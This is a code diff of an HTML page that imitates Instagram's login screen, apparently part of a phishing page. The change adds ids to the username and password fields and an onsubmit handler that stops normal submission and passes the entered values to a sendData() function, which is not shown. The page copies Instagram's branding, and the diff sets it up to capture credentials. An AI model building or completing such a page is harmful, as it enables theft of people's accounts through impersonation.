@@ -138,27 +138,18 @@
 <body>
 
     <div class="main-wrapper">
-        <div class="visual-side">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="50" alt="IG">
-            <h1>See everyday moments from your <span>close friends</span>.</h1>
-        </div>
-
         <div class="form-side">
-            <div class="login-box">
-                <h2>Log in to Instagram</h2>
-                <form id="loginForm">
-                    <input type="text" class="input-field" placeholder="Phone number, username, or email" required>
-                    <input type="password" class="input-field" placeholder="Password" required>
-                    <button type="submit" class="login-btn">Log in</button>
-                </form>
+         <div class="login-box">
+        <h2>Log in to Instagram</h2>
+        <form id="loginForm" onsubmit="event.preventDefault(); sendData();">
+            <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" class="input-field" placeholder="Password" required>
+            
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
 
-                <div class="divider">OR</div>
-
-                <a href="#" class="fb-link">Log in with Facebook</a>
-
-                <p style="text-align:center; font-size: 14px; margin-top: 30px;">
-                    Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none;">Sign up</a>
-                </p>
+        <div class="divider">OR</div>
+        <a href="#" class="fb-link">Log in with Facebook</a>
             </div>
         </div>
     </div>
